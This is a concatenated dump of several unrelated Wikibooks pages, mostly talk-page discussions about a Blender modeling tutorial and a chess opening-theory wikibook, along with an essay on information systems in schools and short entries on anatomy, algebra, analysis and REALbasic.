User Comment: To flatten the front I had to relocate the 3D-Cursor to the vertices where the V-cut comes together, then select only the top half of the vertices and scale in the Y-axis by factor of zero.  Then select the bottom vertices and do the same.  Everything else in the tutorial worked perfectly.

:You need to set the centerpoint thingy back to median, in order for it to work the way it was written, i've bolded it [[User:Pearts|Pearts]] ([[User talk:Pearts|talk]]) 01:32, 11 August 2010 (UTC)

== Normals ==

A thought has just occurred to me... Part of the Jeep Body tutorial detailed how the wrong normals would make part of the model invisible, since the render would ignore the 'inner' surface. My question is... how can we see a render of the inside of the pipes when the normals are shown only on the outside?

[[User:Kevintropman|Kevintropman]] ([[User talk:Kevintropman|talk]]) 15:31, 10 November 2010 (UTC)

== Question about T joint ==

I this section there is one part saying:
&quot;There will be 6 vertex overlapped: 3 vertex linked to the top of the tube, 3 vertex linked to the bottom of the tube Select 3 of this vertex Depending on which half the vertexs are now selected you will need to rotate by -45 or +45.&quot;

Actually there a 14 vertex overlaped, 7 on each side. Also after pressing V there are 7 vertex selected.

The almost last step is to change Pivot to Median Point, but Median Point and 3D Curser are the same? Why should one do that?[[User:Adam.Elenktik|Adam.Elenktik]] ([[User talk:Adam.Elenktik|discuss]] • [[Special:Contributions/Adam.Elenktik|contribs]]) 16:10, 2 June 2013 (UTC)</text>

      <text xml:space="preserve">In its broadest sense, '''anatomy''' is the study of the structure of something, in this case a human.  Human anatomy deals with the way the parts of humans, from molecules to bones, interact to form a functional whole.  The study of anatomy is distinct from the study of physiology, although the two are often paired.  While anatomy deals with the structure of an organism, physiology deals with the way the parts function together.  For example, an anatomist may study the types of cells in the cardiac conduction system and how those cells are connected, while a physiologist would look at why and how the heart beats.  Thus, anatomy and physiology are separate, but complimentary, studies of how an organism works.

==History==
A complete article on the history of anatomy can be found [[w:History of anatomy|here]].

      <text xml:space="preserve">{{ChessProject|importance=Mid|class=Start}}

== Proposal to expand upon the 3. c3 &quot;enhanced&quot; Alapin line ==

What should black play after 3. c3? The only line that even approaches equality (by winning percentage) is e6. In every other line it seems white has a much easier time of it, with win percentages approaching double that of black. I referred to this as an &quot;enhanced&quot; Alapin as white gets an extra developed Knight due to black's essentially wasted h6.</text>

More and more Americans are using the Internet to perform daily activities such as education, business transactions, personal communication, research, job searches and much more.  Information technology is increasingly important for educational advancement and community participation&lt;ref&gt;(U.S. Department of Commerce, Moreover this importance is growing in areas such as Economics and Statistics Administration, &amp; National Telecommunications and Information Administration. (2000, p. xv) &lt;/ref&gt;
  

In a sense, Information Systems (IS) has become the backbone of modern education. IS allows schools to store valuable student information and helps administration manage the school and the district as a whole.  If the use of IS benefits one division of education, then it will benefit the entire educational system.  When an IS tool benefits learning, then it benefits teaching.  If an IS tool benefits teaching, it in turn benefits administration and the learning students and so on.  It is a collaborative effort which affects all aspects of education.  
  

'''&lt;big&gt;ACCOMPLISHING LEARNING WITH INFORMATION SYSTEMS&lt;/big&gt;''' 
  

There have been published studies by many researchers showing strong evidence that technology aids in increasing academic achievement.  Organizations like Edutopia, the North Central Educational Lab (NCREL) and the Center for Applied Research in Educational Technology (CARET) are studying and tracking the tie that shows that technology is increasing academic achievement.  Students do not learn the same way as students did from the 20th century.  Technology has taken over their lives and using it in the classroom can create enthusiasm, better learning outcomes, and sustain interest in all subject areas in academics. 
  

Information systems are used in schools to enhance learning through very dynamic educational software developments ranging from games to virtual field trips.  According to studies, educational software designers have developed games that improve student motivation, promote constructivist and collaborative learning, and improve academic learning.&lt;ref&gt;Computers &amp; Education, v52 n1 p68-77 Jan 2009 &lt;/ref&gt; A sophisticated development involving the science of ecology and underwater marine life using computer animation and virtual technology was investigated.  A qualitative study was also conducted during the case study showing that virtual museums could raise students' interest and learning motivation.&lt;ref&gt;(Journal of Educational Technology Systems, v37 n1 p39-59 2008-2009&lt;/ref&gt; 
  

[http://en.wikipedia.org/wiki/E-learning E-learning] , Web TC, online classes and distance learning are classified as forms of [http://en.wikipedia.org/wiki/Instructional_technology instructional technology ]. Studies provide more favorable results for distance learning courses as effective tools for tracking student performance and withdrawal rate while end-of-semester completion  is barely acceptable.&lt;ref&gt;Journal of College Student Retention: Research, Theory &amp; Practice, v10 n1 p21-37 2008-2009&lt;/ref&gt;   There are numerous distance learning benefits, some of which include:

*Allowing students to attend classes when situations do not permit them to attend the on-campus classroom.
*Online courses give students flexibility to work on assignments when their schedule permits them to at any hour of the day.  This release a student from attending a class where a set day and time is scheduled.
*Ability to do interactive teamwork between groups. Students have the opportunity to correspond with others from different backgrounds and to hear from a variety of speakers from around the world. 
    

The possibility of learning with Information Systems is endless.  Students are able to use the Internet for research with an endless amount of information.  Multimedia presentations can be created in all subject areas.  Students of all ages can use online activities that pertain to their subject matter.  Keyboarding skills can be developed at very early ages, even before pre-kinder.  
To live and learn in an information-rich society, students must be able to use technology effectively in an educational setting and beyond.  
  

'''&lt;big&gt;ACCOMPLISHING TEACHING WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

Today’s teachers are facing many changes and it is becoming a more difficult job because of the numerous amounts of expectations. The use of technology in teaching can actually help with many of the expectations faced by teacher. Because IS changes year to year, it is important for teacher to take part in professional development in technology. Professional development will ensure that technology will be used effectively to create new opportunities for learning and to promote student achievement.
  

Having IS capabilities in the classroom allows students to have reference materials at their fingertips.  The web is a source not only for communication but can also provide reference for an enormous number of topics.  Today's web not only consists of Web sites where information on various topics can be found but it contains videos where the visual learner can study topics in a way that they process information.  One example is [http://school.discoveryeducation.com/ Discovery Education] where just about any topic can be found and used in the classroom. This resource provides educators with engaging digital resources to be more effective in the classroom and in turn increase student interest by connecting the classroom to an abundant amount of information from around the world. When using such resources, the teacher is now a facilitator in learning the subject material and not someone who is lecturing the materials like in the past.   
  

There are so many IS tools that teachers can present to students to aid in the learning process.   Another example is the use of the [http://cmap.ihmc.us/Publications/ResearchPapers/TheoryCmaps/TheoryUnderlyingConceptMaps.htm concept maps].  According to the Florida Institute for Human and Machine Cognition, concept maps are graphical tools to aid in organizing and representing knowledge. &lt;ref&gt;Joseph D. Novak &amp; Alberto J. Canas, Florida Institute for Human and Machine Cognition, Pensacola Fl 
http://cmap.ihmc.us/Publications/ResearchPapers/TheoryCmaps/TheoryUnderlyingConceptMaps.htm &lt;/ref&gt; This type of software allows students to work individually or in groups to create concept maps.  Students retain information using various learning styles.  


Much of the decision-making within schools is made from analyzing the data collected using IS technology.  An example of this IS technology would be an online test repository such as [http://www.fscreations.com/ Exam View] or [http://quizstar.4teachers.org/ Quiz Star] where students can take tests using the web and the results are graded instantly.  These online tools store the test and answers but will also keep students answers.  Reports can be generated immediately after the class has completed the test.  The data from the reports will be immediately available for teachers so they can analyze where students are struggling. 
&lt;ref&gt;Critical Issue: Using Technology to Improve Student Achievement , http://www.ask.com/bar?q=teachers+using+computers+in+classroom&amp;page=2&amp;qsrc=2417&amp;zoom=%3CKW%3EClassroom%3C%2FKW%3E+Decorating+Ideas%7C%3CKW%3EClassroom%3C%2FKW%3E+Management%7CPositive+Effects+of+%3CKW%3EComputers+in%3C%2FKW%3E+the+%3CKW%3EClassroom%3C%2FKW%3E&amp;ab=4&amp;u=http%3A%2F%2Fwww.ncrel.org%2Fsdrs%2Fareas%2Fissues%2Fmethods%2Ftechnlgy%2Fte800.htm, North Central Regional Educational Laboratory, Date updated: 2005 &lt;/ref&gt;
  

'''&lt;big&gt;ACCOMPLISHING MANAGEMENT WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

A [http://en.wikipedia.org/wiki/Database Database]  is a collection of programs that store and retrieve large amounts of information. Every school district and school building needs a way to track data that is collected for their district, state, and federal governance.  Schools can effectively maintain records of students' data, to include grades, schedules, absences, demographics, test scores, behavior, and medical records.  
 
An example of this type of system is SIS,  [http://www.sisk12.com/ School Information System].  Schools need a way to collect data and be able to print out reports using this data for evaluation purposes.  The software needed for the school/student management purpose needs to be efficient and at the fingertips of administration.  At anytime the parent, school board, or government can request information that is provided by the schools management system.  A management system can hold test scores which allow schools and teachers to see trends that are occurring.  Possibly new techniques are used to improve learning which caused test scores to improve.  A management system can show the rise in test scores to validate the effectiveness of the techniques used for students learning. 
 
Another aspect that IS plays a large roll in as a management tool is where students are scheduled for classes.  A school of 400 high school students could be a nightmare if it had to be done by hand.  The use of computer software can store students' preference or abilities in a database.  When schedule is done for the next school year, the database can be used to place students in the appropriate classes.  
  
The software application Administrator's Plus, developed by [http://www.rediker.com/accounting_software.html Rediker Software], collects the budget data that a school sets up and tracks the spending of the moneys.  At anytime a Year-to-date expenditures versus budget report can be produced.  This helps with over spending and improves accurate allocations of monies to various departments.  
  

'''&lt;big&gt;COLLABORATING WITH INFORMATION SYSTEMS &lt;/big&gt;'''


IS can be used for students to collaborate with each other and with the teacher.  For example, teachers can introduce a new software product they want students to use.  Students who have used the product before can help other students with less experience to master the use of the software.  Many times students work on individual created projects.  In the real world of work, people have to rely on each other to produce a quality product.  If students learn to work together, they will be successful when they enter the employment world.    
 

Collaboration between teachers can occur if lessons are stored in a centralized location in a database or on a server.  This way teachers can borrow lessons that will improve student's performance on a particular topic.  [http://profilerpro.com/ ProfilerPRO] allows for the evaluation of knowledge, attitude, and skill based on simple surveys implemented via the World Wide Web. Group members can share knowledge and promote collaboration based on responses to skills-based survey items. The use of this type of IS can strengthen education by allowing the ability to share expertise.  
  

In the past parents did not see students' grades until progress time or a report card was sent home.  The use if IS has changed this process.  Many schools now have the capability to allow parents to view their child's grades online.  As mentioned before, using [http://www.sisk12.com/ School Information System (SIS)] allows parents to see their child's grades, assignments and tests. This collaboration between teachers and the parents help in working together to help the student succeed.   Now, the parents will have no surprises when it comes to report card day. 
  
IS in schools can help teachers and student learn about other cultures and societies.  By using the web, students can chat and view live-web cams of other students in class around the world.  Additionally teachers can converse with teachers in other societies to share activities, projects and collaborative lesson plans.  The web can also host webniars, where students from all over the world can be in the class learning together.  Also, blogs can be used to post information on educational topics to be shared by all.  
  

'''&lt;big&gt;COMMUNICATION WITH INFORMATION SYSTEMS &lt;/big&gt;'''
  

Outlook Email, a Microsoft [http://en.wikipedia.org/wiki/E-mail email] application, is great communication software to use when connecting with your friends and family. According to the [http://email.about.com/cs/winclientreviews/gr/outlook.htm About.com] website, there are many pros and cons when it comes to using Outlook Email. Some pros indicated were:  &quot; Snappy, flexible search, virtual folders and mail grouping help you organize mail, Outlook integrates email messages, to-do lists and scheduling&quot;.  Some of the cons that were pointed out included &quot;Outlook is a bit confusing to set up and can be confusing to use with its myriad of options, and Outlook lacks useful message templates, and its RSS feed reader flexibility.”  
&lt;ref&gt;: About.com:Email, http://email.about.com/cs/winclientreviews/gr/outlook.htm &lt;/ref&gt;  
 

A lot of businesses use Microsoft Outlook as it's great at managing multiple accounts. Another great aspect of this application is that it has a built in encryption control, it will let you view attached files while inside the message and it leads you edit messages in Microsoft Word and even send an email from Microsoft Word.  
   

Many schools already incorporate a type of IS that patent's can have access to their child's grades and absences.   Basically, parents sign up for their own user name and password and they can log on to have access to this type of information.   Through this IS tool, schools can communicate with parents to inform them of their child's progress in each class 24/7. 
    

Communication can be done via the Web.  Students can access the web by connecting to the internet using Dial-up access, wireless networks, DSL [http://en.wikipedia.org/wiki/Digital_subscriber_line (Digital Subscriber Line)], satellite modem and cable modems. Schools today have Web sites where they have a link to school calendars, upcoming sporting events, contact information for the school and teachers, library resources and much more.  Without IS this all would not be possible.  By using this method of communication, schools relay information to parents and students in a timely manner.

=Grob's Attack=
===1. g4 e5===
This move is interesting not because it is a commonly-played move, nor because it gives an advantage to either player, but because white has not one but two moves that lead to an early black checkmate. [[/2. f4|2. f4??]] transposes to the Bird Opening's From Gambit, but this matters little because black can easily mate. [[/2. f3|2. f3??]] leads to the same early demise for white, this time transposing to the Barnes opening. Both these blunders are called Fool's Mate, and tie for the fastest possible checkmate for black.

Although Grob's Attack is itself rarely used among serious players, [[/2. d3|2. d3]] is a more serious alternative.

== I will be rude ==

What an idiot wrote this? Did this idiot ever played Grob? Did he know that this move has near 40% of wins (2.Bg2 almost 50% of wins)? All this topic is about Fool's mate! Strange, but I didn't saw such stupidity in f3 and f4 topic. Here is no theory about g4/e5, just thinkings of four years old kid...</text>

== Language wikibooks ==

I noticed your recent edits on the [[Chinese]] wikibooks. Unfortunately, it doesn't seem to have many active contributors. Writing language textbooks is a long and difficult process, not all contributors have the patience and some bite off a bit more than they can chew. That was the case with the [[Japanese]] wikibook when I started contributing to it nearly a year ago. Thanks for your contributions so far.

If you and your teacher would like to work on this wikibook to use it in your classes, that could be of great help. Some books here at Wikibooks are also written largely or in part by students in a course, under the oversight of a teacher.

Please let me know if you have any questions or comments. Note also the various [[Wikibooks:Reading room]]s where you can get a wider audience for your comments or requests for assistance. Good luck with your studies, welcome to Wikibooks and happy editing! --[[User:Swift|Swift]] ([[User talk:Swift|talk]]) 06:29, 17 March 2009 (UTC)


:Thanks, Swift.  We probably won't use this for our class, because we are already well into the papyrus version of a book.  And since I'm not fluent, my own contributions will probably be limited.  But I'll improve what I can when I get around to it.  :-)  --[[User:Yakowenko|Yakowenko]] ([[User talk:Yakowenko|talk]]) 21:55, 25 March 2009 (UTC)</text>

 |description=Books in this subject area deal with '''[[w:algebra|algebra]]''': the study of structures and relationships that arise between numbers and the operations on them.  In addition to working directly with numbers, algebra also studies symbols, variables, or generally elements on a set in relation to operations such as addition and multiplication.  Addition and multiplication and the other operations on numbers are sometimes viewed as more general operations, and their precise definitions lead to structures such as groups, rings, and fields.

 |description=Books in this subject area deal with '''[[w:mathematical analysis|mathematical analysis]]''': the branch of mathematics most explicitly concerned with the notion of a limit, whether the limit of a sequence or the limit of a function. It also includes the theories of differentiation, integration and measure, infinite series, and analytic functions. These theories are often studied in the context of real numbers, complex numbers, and real and complex functions.

== London System ==

Clearly, in the London System, after 3. Bf4 c5 the next move cannot be Bg2 as White has not yet moved his g-pawn. I will replace &quot;4. Bg2 Bf5 5. e3 e6&quot; by &quot;4. e3 e6&quot;, but if someone who knows the L. System better wants to improve this further, feel free.

The movelists here are still messed up.  It looks like a template someone didn't change, or vandalism.  I'm on it!  [[User:Goatasaur|Goatasaur]] ([[User talk:Goatasaur|discuss]] • [[Special:Contributions/Goatasaur|contribs]]) 17:45, 29 April 2011 (UTC)</text>

      <text xml:space="preserve">== Why REALbasic ==
There are a lot of options available for those wanting to learn computer programming. However, we believe that REALbasic is a particularly great way to learn modern programming concepts and techniques.

=== Object-Oriented Programming ===
REALbasic makes learning '''object-oriented programming''' (OOP) simpler than languages like Objective-C or C#. Users have said that learning REALbasic made transitioning to Objective-C almost painless: you learn good OOP techniques as you master REALbasic.

      <comment>/* Normal Coordinates (!?!!?) */</comment>
      <text xml:space="preserve">== Must not, may not, need not? ==
I've written in the original text:
: ''The origin of the the local coordinates is called the center of the object (which must not necessarily be in the center of the object). ''
Someone corrected me and wrote:
: ''The origin of the the local coordinates is called the center of the object (which may not necessarily be in the center of the object).''
Well, what I want to say is, that the object center may be in the center of the object, but it isn't necessarily the case. The object center may be anywhere. So who can put this right? --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 15:54, 18 March 2009 (UTC)

I think it's confusing because it's called object center, and that's not really what it is. &quot;The origin of the local coordinates is called the rotation axis; it can be located anywhere.&quot; would make it clearer to me.
--[[User:Wgoelkel|Wgoelkel]] ([[User talk:Wgoelkel|talk]]) 00:13, 5 April 2009 (UTC)
: No, the rotation axis is something different. The object center is a point (0 dimensions), an axis is a line (1 dimension). So it's just what it is - &quot;the center of the object is the origin of the local coordinates&quot;. Nothing more and nothing less. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 16:00, 5 April 2009 (UTC)

: Good point. How about: &quot;The origin of the the local coordinate system is called the object center. It can be located anywhere, inside or outside of the object.&quot;
:: A little variation: &quot;&quot;The origin of the the local coordinate system is called the object center. It can be located anywhere, e.g. in the gravitational center of the object or even outside the visible mesh.&quot;
:: I find it difficult to describe, because the term object has in Blender several meanings, and you have to be completely aware of the context in which the term is used. A visible object like a cube has at least two parts: 
::#  a data structure that holds the position/rotation/scale of the object 
::# a mesh data block that contains the position of the individual vertices.  
:: Often beginners say &quot;Object&quot; and mean only no. 2, whereas a more advanced user always thinks no. 1 together with no. 2. --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 05:39, 6 April 2009 (UTC)

::I've seen where other programs refer to it as a Handle point.  Meaning that if you were to pick up, or manipulate an item, you'd do so with it's handle.  Is there anything tying us down to using a reference to &quot;sometimes non centered center point&quot;?  Now, if that center point is the center of the Bounding box, I could see it being called that, but otherwise, it's simply not a center at all unless you decide to rotate the object with it.  &quot;Object Origin Point&quot; (vs. World (or global) Origin Point, as you mentioned here) seems more informative in an associative definition, and more accurate under all conditions, rather than a single operation.--[[User:Deadguy|Deadguy]] ([[User talk:Deadguy|talk]]) 15:59, 24 August 2009 (UTC)

== Invisible grandparent ==

From the article:
''In Fig. 1b the cup is a child object of the right coordinate cross. The child itself has no local rotation. The right coordinate cross has itself an invisible parent. It is parent and child at the same time. The right coordinate cross is rotated along its global Z axis, the tilt against the world axis is created by the invisible grandparent.''

Isn't the tilt caused by the tilt of the parent, regardless of whatever caused it to tilt?  I think perhaps it should stick to that, perhaps including the suggestion that the parent may also be the child of another parent, whose movements may affect all of it's attached children, and their children.  The concept of introducing invisible grandparents when everything else they run into is likely to refer to parents and children might confuse the issue.

I understood the concept before I read it, and had to look at it for awhile to understand how a third party was at work on the rotation shown, as opposed to a straightforward rotation.  If this were a new concept, I'm not sure I would have followed well enough to understand that the invisible grandparent was more of a &quot;it could be&quot; scenario, and instead would have moved-on thinking I'd try and figure-out the impact of that tidbit later-on if I saw it again.

Great article though..

: You are probably right. Is it sufficient to change the text, or should the image also be altered? If changing the text is enough, would you like to do it? --[[User:SoylentGreen|SoylentGreen]] ([[User talk:SoylentGreen|talk]]) 04:34, 25 August 2009 (UTC)


== Surface Normal Description ==
In the section &quot;'''Normal coordinates'''&quot; you say that the normal &quot;''is always perpendicular to the surface''&quot; (which fits with my previous encounters with the term), but later say that for edges &quot;''the normal runs along the edge''&quot;.

This runs counter to my previous 3D experience, and also contradicts the earlier definition. Surely, the normal on an edge is the average of the normals of the faces on either side ? Unless Blender users the term in an odd way.
--[[User:Alun|Alun]] ([[User talk:Alun|talk]]) 10:28, 7 November 2009 (UTC)

:I removed the claim, which seems highly unlikely.  I'm still looking for evidence that Blender uses &quot;normal coordinates&quot; in any context.  I think the key concept here is &quot;normal&quot;, which should be explained in a different module. --[[User:Stepheng3|Stepheng3]] ([[User talk:Stepheng3|talk]]) 14:37, 21 October 2010 (UTC)

== Normal Coordinates (!?!!?) ==

The last section begins &quot;Although Blender is a 3D program, only the faces are visible.&quot;
I'm guessing this is detritus from previous edits. I can't make sense of it, so I'm not sure what concept it is supposed to introduce, so I can't suggest a better wording. Maybe just remove it?

More importantly, is there such a thing as &quot;Normal coordinates&quot;?
The normal is a (calculable) property of the vertex/edge/face, not a distinct entity. Maybe fig.4 should show ''only'' the blue arrows, as the red and green ones aren't relevant to any process in the rendering pipeline [are they?] -- normal is a 1D concept by definition, and only need to be 1D for the various purposes they are used (in the rendering pipeline); showing them as coordinate crosses is somewhat confusing, if not misleading.

Maybe the last section should be entitled &quot;Normals&quot;, if the concept really needs to be introduced here at all(?) -- I suspect this section is/was/tried-to-be about explaining hidden surface removal w.r.t. surface normal direction relative to the viewport plane.  (Quite a few years since I studied 3D CG under Alan Watt, so maybe memory-fade has resulted in me talking utter nonsense here.)
[[User:Zoinks|Zoinks]] ([[User talk:Zoinks|talk]]) 17:34, 26 October 2010 (UTC)

Personnally my problem is with &quot;The normal of a point is the average of normals of the adjacent faces&quot;. My conclusion is that what you meant is : &quot;The normal of a point is the average of normals of the adjacent ''''points'''' &quot;
([[User:Zigomar|Zigomar]] ([[User talk:Zigomar|discuss]] • [[Special:Contributions/Zigomar|contribs]]) 21:25, 20 October 2011 (UTC))

:No, I think the original wording is correct. Finding the normal of a planar face could be done by taking the cross product of two edges. The normal of a point (points have no direction) would actually refer to any vector (all vectors are perpendicular to zero vector). When specifying the normal to a point for something like http://en.wikipedia.org/wiki/Gouraud_shading, you'd take the average of all adjacent faces. The vertex in this case is supposed to represent a point on a curved ''surface'', which would have an exact normal vector if represented mathematically, but the digital representation means it can only be approximated by looking at surrounding faces. That's my beginner's understanding, anyway. I don't know what's meant by &quot;Although Blender is a 3D program, only the faces are visible.&quot; , though.</text>

      <text xml:space="preserve">==Hi all==
Hi all.  My hope here is to have a wiki that will delve in to some of the opening lines with some explanation.  I think this is different from the &quot;Basic Openings&quot; module -- I think it is at least an intermediate topic.  While some sites exist that have &quot;opening explorers,&quot; none are wikis.

I would hope that at each half move, experienced chess players could annotate the description and provide some insight into the postion -- perhaps leading readers to the idea of themes rather than memorization of moves.  I would especially like to see annotations at those points in the lines where classic chess opening tomes simply stop and say something like &quot;giving black good chances.&quot;  Instead, it would be nice if there was a lively discussion about the line going forward.  Some of the refuted lines aren't even discussed in the opening tomes -- even though their refutation is anything but obvious to the amateur.  A good example of this is the [[Opening theory in chess/1. e4/1...e5/2. Nf3/2...Nc6/3. Bc4/3...f5|Rousseau Gambit]].

Finally, it is not my intention to replace the great opening articles on Wikipedia.  Again, I'd like to see kibitzing at the various points in the opening lines.

hi there. Chi Sigma here, from Britain, rated 146 ECF (1980 ELO), sporadic Wikipedian. You're right, it would be great to create an opening explorer in wiki form, and I found this place while searching for help on how I'd go about doing exactly that. I think this could (should) be a big thing. I'll do what I can. [[User:Chi Sigma|Chi Sigma]] 13:14, 27 September 2005 (UTC)

== Important notice ==

The Chess wikibook had separate chapters called Basic Openings and Opening Theory. The Opening Theory module covered the same broad subject as Basic Openings but using a significantly different approach. While Basic Openings was a linear chapter, Opening Theory aimed to be an opening explorer along the lines of this web site [http://www.eudesign.com/chessops]. In addition, Basic Openings was... basic, while Opening Theory had a theoretically unlimited depth.

'''I have made the former Opening Theory chapter of the Chess wikibook into a separate wikibook, called 'Opening theory in chess'.'''

My reasons for doing this centre on the fact that the Chess wikibook is meant to a) reach 100% completion eventually and b) be something that a reader can get through from cover to cover and which will provide a working knowledge of the basics of chess. The Opening Theory chapter was inconsistent with this because:

*Opening theory ''dwarfs'' the rest of chess literature. One needs only to look at the typical bookstall at a chess tournament to see this. It would take a long time and a lot of effort to create the definitive guide to chess openings, which would retard the completion of the Chess wikibook as a whole. Indeed, Chess is nearing completion, while Opening theory in chess is close to 0%.
*The Opening Theory chapter was intended to be open-ended and constantly evolving in breadth and depth, like the Cookbook, with the result that Chess could ''never'' be 100% complete. Better, to my mind, to have one complete and readable book with a link to another constantly evolving one 'for further information'. 
*The concepts behind opening theory get complicated and potentially off-putting to someone who simply wants to know a bit about chess.

I believe this complies with Wikibooks' no-forking policy because:
*The approaches used by the two books are completely different
*The content itself differs in scope and depth
*The minimal actual duplication of material is for the greater good of Wikibooks as I have explained above.

:Thank you for putting this notice both in the Chess Wikibook as well as on this discussion page.  My first impression was that it should be included in the Chess Wikibook instead, but I see what you are suggesting.  My only concern is that this Wikibook doesn't seem to flow like a &quot;book&quot;, at least to introduce some opening moves one at a time, but rather is more of an index into a bunch of &quot;articles&quot; about opening moves in Chess.  Such an index is necessary, but I'm not sure if it there could be some more organization with this Wikibook?

:You are correct that the content of this Wikibook could completely overwhelm a general introduction to Chess, as the Chess wikibook can and ought to be.  Good luck with this project, and I hope that it continues to progress.  --[[User:Robert Horning|Rob Horning]] 08:18, 15 October 2005 (UTC)

== More Progress Needed ==

More needs to be done with this wikibook. This would be a great asset to anyone interested in openings out there. Here is a website that has it's own opening explorer with some statistics like the most played and % wins for white and black and percentage for a draw. www.chessgames.com
There is also kibitzing on the site which is very useful for some more info. They also have pages on just particular openings which also have kibitzing. Check it out, I would like to see this wikibook become much more extensive in the coming months. [[User:128.6.175.75|128.6.175.75]] 20:23, 19 January 2006 (UTC)
:Hi, I'm new to wikibooks but have been editing on wikipedia for about a year. I've been studying chess more than 10 years though I'm not as active in the tournament scene. Anyway, I'm going to flesh out a number of lines--at least to give pages for such basic openings as the Queen's Gambit (until now, there were no pages in this wikibook covering the declined or accepted lines). For now I'm just cutting and pasting the basic page and editing to put links to wikipedia for named lines (such as Tarrasch Defense etc.). For now I'm not as interested in getting in-depth as I am at least giving the barest overview of the main lines; at the least, there should at least be red links listed for the main lines so people at least have the barest clue what the main options are.--[[User:JECompton|JECompton]] 01:46, 22 June 2006 (UTC)

== A few Questions on Making Pages in This Book ==

One first question: when should a named line link to wikipedia, and when should it link back into this wikibook?--[[User:JECompton|JECompton]] 01:46, 22 June 2006 (UTC)
::At one point I added many links to wikipedia but then I got taken to task for it. Basically WikiBooks is suppose to be self contained books, so links to wikipedia are discouraged. You can read more here [[Help:Wikibooks for Wikipedians]]. [[User:SunCreator|SunCreator]] ([[User talk:SunCreator|talk]]) 21:26, 25 June 2008 (UTC)

A second: When should I put slashes at the end of moves? I notice some of the existing pages have them while others don't. It makes for some confusion with making the links, though I think the confusion is mine--as long as I understand the form here, I'll be happy.--[[User:JECompton|JECompton]] 03:41, 22 June 2006 (UTC)
:Nevermind. By looking around the 1.e4 pages, I see that my broken link must have had a different problem, and as long as I follow the 1.e4 pages format, I'll be fine.--[[User:JECompton|JECompton]] 04:04, 22 June 2006 (UTC)

3rd q: at the top of this module, it says one can navigate by ECO code. I don't see this anywhere. How is this implemented?--[[User:216.184.15.227|216.184.15.227]] 15:47, 22 June 2006 (UTC)

:Would [[Opening theory in chess/ECO index]] be it? --[[User:Hagindaz|hagindaz]] 22:25, 22 June 2006 (UTC)
:: Ah, that would be it. Unfortunately, it only covers some of the 'A' volume openings--lots of work to be done still. Thanks again Hagindaz!--[[User:JECompton|JECompton]] 01:42, 25 June 2006 (UTC)

:::Well I started on B. The odd thing is, we're a little more than half done with A. --[[User:Anonymouse|Anonymouse--nerd and proud of it]] ([[User talk:Anonymouse|talk]]) 19:52, 24 June 2008 (UTC)
::::Yes, because it takes quite a bit of time to create it. So while it was stated no one got around to finishing it. [[User:SunCreator|SunCreator]] ([[User talk:SunCreator|talk]]) 21:27, 25 June 2008 (UTC)

== Opening Ideas ==

how about describing the main ideas of each opening, instead of just collecting theory?  This would make it more a sort of textbook - has this been the intention? [[User:FairPhyllis|FairPhyllis]] 20:17, 4 November 2006 (UTC)

== Suggestion. ==

I would like to suggest if the ‘Chess’ Wikibook could be separated into three distinct levels, beginner, intermediate and advanced.
This will allow for more abstract techniques to be included in a series of coherent chess text books.
‘Opening theory in chess’ could be included into intermediate and all levels could have a portal to allow accessibility. --[[User:Herraotic|Herraotic]] 20:48, 7 December 2006 (UTC)

I don't know that I agree with this.  Certain concepts are more advanced, but this sounds more like the framework of another wiki book on chess tactics and strategy which still is no easy task.  I still would prefer an additional book of this nature.  Even some better players would benefit from this as well as beginners.

--[[User:Chessnutz|Chessnutz]] 18:56, 19 July 2007 (UTC)

== About notation... ==

Do you note castling by 0-0 or O-O ???

Do you use the e.p. notation after a pawn captures en passant ???

Do you include moves evaluations like !, ?, !?, ?!, !! and ??

What are the positions evaluation we should use ? I've been using : +/- -/+ =/+ +/=, are there other ? How are they ordered ?

[[User:Horyon|horyon]] 13:14, 26 December 2006 (UTC)

Castling is O-O as in PGN. There are no ! and ?s in the page names, nor indications of check/checkmate, nor e.p. though these may be included in the main text and hyperlinks.

Position evaluations are optional. Stick with the Informator symbols: +- +/- +/= = =/+ -/+ -+ in that order. [[User:Chi Sigma|Chi Sigma]] 12:12, 11 July 2007 (UTC)

:Castling is written as O-O and O-O-O, for kingside and queenside castling respectively. Try to avoid !, ?, !? etc.

: And evaluation of unclear? use &amp;infin; or ~ (seen this ~ used on wikipedia) or not use at all? [[User:E5ricky|E5ricky]] 22:17, 24 October 2007 (UTC)

== Links to this wikibook in the wikipedia ==

I've remarqued that a few pages about chess in the wikipedia have links toward this wikibook, but often these links are incorrect (I've often seen 1.e4 instead of 1. e4 and Chess/Opening theory instead of Opening theory in chess). So maybe we should try to :
# check all the links and correct them when needed
# add links in all other pages about chess openings

This would increase the popularity of this wikibook.

The question is : should we only include a general link to this wikibook or should we link every move in a wikipedia page to the corresponding page in the wikibook ?

[[User:Horyon|horyon]] 02:04, 6 January 2007 (UTC)

It's all my fault, I'm afraid. I carved out Opening Theory into a separate wikibook, for reasons I've explained elsewhere on this page, and introduced a new scheme for naming pages to fix a specific technical problem.

The plan: Over a couple of weeks, I move all the existing pages to their new addresses, and then redirect all the links from Wikipedia. 

What actually happened: Just when I'd made all the changes, I lost internet access for a long time. Thus leaving the Wikibook pretty well bollocksed up.

My apologies to everyone whose enjoyment of Wikibooks has suffered.

I intend to fix all the broken links some time soon, and then see if I can make some sort of dent in the enormous job of writing the content.

In answer to horyon: For sure, we should link from Wikipedia to the exact page in this Wikibook - it's added functionality at almost no cost in effort, no? [[User:Chi Sigma|Chi Sigma]] 22:30, 15 February 2007 (UTC)

== Progress ==

Hi all.  It's been about 2 years since I have had a chance to revisit this work.  I am impressed by some of the progress various authors have made.  I hope to be able to indulge my chess affection some again soon and hope to begin contributing again.[[User:ThreeE|ThreeE]] 02:00, 4 August 2007 (UTC)



== Theory Table on Initial position ==

This table looks poor (just a long list(space padded) of first move and I don't think a theory table is going to be suitable on this page. Maybe extend the quick menu or something similiar. [[User:E5ricky|E5ricky]] 23:46, 20 October 2007 (UTC)

:: It's sorted out now [[User:E5ricky|E5ricky]] 15:09, 23 October 2007 (UTC)

== Question ==

Not sure if this is really the place to ask, but is there a page for the Catalan?  I couldn't find it under the list on the d4 page.  Sorry to bother if there isn't. :|  [[Special:Contributions/207.30.253.250|207.30.253.250]] ([[User talk:207.30.253.250|talk]]) 20:31, 3 March 2008 (UTC)

